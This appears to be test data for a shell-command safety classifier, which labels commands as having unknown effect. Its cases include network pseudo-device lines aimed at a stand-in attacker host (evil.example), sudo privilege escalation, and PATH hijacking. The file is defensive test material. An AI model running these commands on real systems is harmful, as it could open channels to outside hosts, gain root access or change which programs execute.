posix effect=unknown | grep x /dev/udp/evil.example/53
posix effect=unknown | wc -c < /dev/TCP/evil.example/80
# Wrappers that do more than run the program after them.
posix effect=unknown | flock /tmp/l cat a.txt
posix effect=unknown | nohup cat a.txt
posix effect=unknown | tmux new cat
posix effect=unknown | screen -dm cat a.txt
posix effect=unknown | sudo -i
posix effect=unknown | sudo -e /etc/hosts
posix effect=unknown | command -v ls
posix effect=unknown | exec
# What changes which program runs or what it does.
posix effect=unknown | PATH=. ls
posix effect=unknown | PATH=./bin ls
posix effect=unknown | PATH=./bin; ls
posix effect=unknown | export PATH=./bin; ls
posix effect=unknown | export "PATH=./bin"; ls
